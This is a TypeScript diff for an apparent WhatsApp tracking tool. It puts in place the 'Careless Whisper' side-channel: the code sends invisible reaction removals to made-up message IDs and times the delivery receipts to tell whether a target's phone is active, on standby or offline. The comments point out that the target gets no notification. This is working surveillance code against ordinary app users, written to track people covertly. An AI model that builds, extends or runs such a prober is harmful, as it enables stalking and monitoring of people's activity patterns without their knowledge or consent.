@@ -14,21 +14,29 @@ interface ProbeState {
 }
 
 /**
- * Method 2: RTT Probing (Silent — zero visibility)
+ * Method 2: RTT Probing — "Careless Whisper" technique
  *
- * Uses read-only WhatsApp API calls to measure round-trip time
- * WITHOUT sending any visible message, reaction, or notification to the target.
+ * Based on the peer-reviewed "Careless Whisper" paper (Gegenhuber et al., 2024,
+ * Best Paper Award at RAID 2025).
  *
- * Approach: Calls presenceSubscribe() and profilePictureUrl() which are
- * read-only queries at the protocol level — the target never sees anything.
- * The response latency reveals device state:
+ * Sends reaction REMOVALS (empty text '') to non-existent message IDs.
+ * This is 100% invisible to the target:
+ * - WhatsApp servers do NOT validate whether the message ID exists
+ * - The reaction is forwarded to the target's device(s)
+ * - Each device processes it and sends back a delivery receipt (CLIENT_ACK)
+ * - Since the reaction references nothing, it is silently discarded
+ * - No notification, no UI change, no visible artifact on the target's phone
+ * - Removing a reaction (empty string) is "entirely invisible to the targeted user"
  *
- * - Active: screen on, low RTT (~200-500ms)
- * - Standby: screen off/backgrounded, higher RTT (~1000-3000ms)
+ * The delivery receipt RTT reveals device state:
+ * - Active (foreground): ~300-500ms
+ * - Standby (screen off, WiFi): ~1-2s
+ * - Standby (screen off, mobile): ~2-3s
  * - Offline: no response within timeout
  */
 export class RttProber extends EventEmitter {
   private probeStates = new Map<string, ProbeState>();
+  private pendingProbes = new Map<string, { sentAt: number; resolve: (rtt: number | null) => void; timer: NodeJS.Timeout }>();
 
   constructor(private readonly connection: ConnectionManager) {
     super();
@@ -38,11 +46,19 @@ export class RttProber extends EventEmitter {
    * Start probing a set of JIDs.
    */
   async start(jids: string[]): Promise<void> {
+    // Listen for message updates (delivery receipts / CLIENT_ACK)
+    this.connection.onBaileysEvent('messages.update', (updates) => {
+      for (const update of updates) {
+        this.handleMessageUpdate(update);
+      }
+    });
+
+    // Start probing each JID
     for (const jid of jids) {
       this.startProbing(jid);
     }
 
-    log.info({ count: jids.length }, 'RTT prober started (silent mode)');
+    log.info({ count: jids.length }, 'RTT prober started (Careless Whisper mode)');
   }
 
   /**
@@ -88,57 +104,85 @@ export class RttProber extends EventEmitter {
     for (const [jid] of this.probeStates) {
       this.stopProbing(jid);
     }
+    for (const [, pending] of this.pendingProbes) {
+      clearTimeout(pending.timer);
+      pending.resolve(null);
+    }
+    this.pendingProbes.clear();
     log.info('RTT prober stopped');
   }
 
   /**
    * Send a single silent RTT probe to a JID.
    *
-   * Uses presenceSubscribe() as primary probe — this is a read-only
-   * WhatsApp protocol query that triggers no notification on the target's device.
-   * Falls back to profilePictureUrl() if presence subscribe is not available.
+   * Sends a reaction REMOVAL (empty string '') to a non-existent message ID.
+   * This is entirely invisible — confirmed by the Careless Whisper research paper.
+   * The target's device processes it silently and returns a delivery receipt.
    */
   private async probe(jid: string): Promise<void> {
     const sock = this.connection.socket;
     if (!sock || !this.connection.isConnected) return;
 
+    // Generate a realistic fake message ID (matches WhatsApp's format)
+    const fakeMessageId = `3EB0${this.randomHex(16)}`;
+    const probeId = `${jid}:${fakeMessageId}`;
     const sentAt = Date.now();
-    let rttMs: number | null = null;
+
+    // Create a promise that resolves when we get the delivery receipt or timeout
+    const rttPromise = new Promise<number | null>((resolve) => {
+      const timer = setTimeout(() => {
+        this.pendingProbes.delete(probeId);
+        resolve(null); // Timeout = offline
+      }, DETECTION.RTT_TIMEOUT_MS);
+
+      this.pendingProbes.set(probeId, { sentAt, resolve, timer });
+    });
 
     try {
-      // Primary: presenceSubscribe is a read-only protocol query
-      // It asks WhatsApp servers about the target's presence
-      // The server response time correlates with device reachability
-      await Promise.race([
-        sock.presenceSubscribe(jid),
-        new Promise((_, reject) =>
-          setTimeout(() => reject(new Error('timeout')), DETECTION.RTT_TIMEOUT_MS)
-        ),
-      ]);
-
-      rttMs = Date.now() - sentAt;
-    } catch (err: any) {
-      if (err?.message === 'timeout') {
-        // Timeout = likely offline
-        rttMs = null;
-      } else {
-        // Try fallback: profilePictureUrl is also read-only
-        try {
-          const fallbackStart = Date.now();
-          await Promise.race([
-            sock.profilePictureUrl(jid, 'preview').catch(() => null),
-            new Promise((_, reject) =>
-              setTimeout(() => reject(new Error('timeout')), DETECTION.RTT_TIMEOUT_MS)
-            ),
-          ]);
-          rttMs = Date.now() - fallbackStart;
-        } catch {
-          rttMs = null;
-        }
+      // Send a reaction REMOVAL (empty text = removal) to a non-existent message.
+      // Empty string reaction = removing a reaction that doesn't exist = 100% invisible.
+      // The server forwards it, the device processes it silently, sends back CLIENT_ACK.
+      await sock.sendMessage(jid, {
+        react: {
+          text: '',  // Empty = reaction removal = completely invisible
+          key: {
+            remoteJid: jid,
+            id: fakeMessageId,
+            fromMe: false,
+          },
+        },
+      });
+    } catch {
+      // If send fails, resolve as offline
+      const pending = this.pendingProbes.get(probeId);
+      if (pending) {
+        clearTimeout(pending.timer);
+        this.pendingProbes.delete(probeId);
       }
+      this.emitRttSignal(jid, null);
+      return;
     }
 
+    const rttMs = await rttPromise;
     this.emitRttSignal(jid, rttMs);
+  }
+
+  /**
+   * Handle delivery receipt / message ACK (status 3 = CLIENT_ACK).
+   */
+  private handleMessageUpdate(update: { key: { remoteJid?: string | null; id?: string | null }; update: Record<string, unknown> }): void {
+    const jid = update.key.remoteJid;
+    const msgId = update.key.id;
+    if (!jid || !msgId) return;
+
+    const probeId = `${jid}:${msgId}`;
+    const pending = this.pendingProbes.get(probeId);
+    if (!pending) return;
+
+    const rttMs = Date.now() - pending.sentAt;
+    clearTimeout(pending.timer);
+    this.pendingProbes.delete(probeId);
+    pending.resolve(rttMs);
   }
 
   /**
@@ -175,7 +219,7 @@ export class RttProber extends EventEmitter {
       ? state.recentRtt.reduce((sum, v) => sum + v, 0) / state.recentRtt.length
       : null;
 
-    // Classify
+    // Classify using dynamic threshold (median * 0.9)
     let classification: RttClassification;
     if (rttMs === null) {
       classification = 'OFFLINE';
@@ -200,5 +244,17 @@ export class RttProber extends EventEmitter {
 
     log.debug({ jid, rttMs, classification, movingAvg, median: state.medianRtt }, 'RTT probe result');
     this.emit('signal', signal);
+  }
+
+  /**
+   * Generate a random hex string of the specified length.
+   */
+  private randomHex(length: number): string {
+    const chars = '0123456789ABCDEF';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+      result += chars[Math.floor(Math.random() * 16)];
+    }
+    return result;
   }
 }
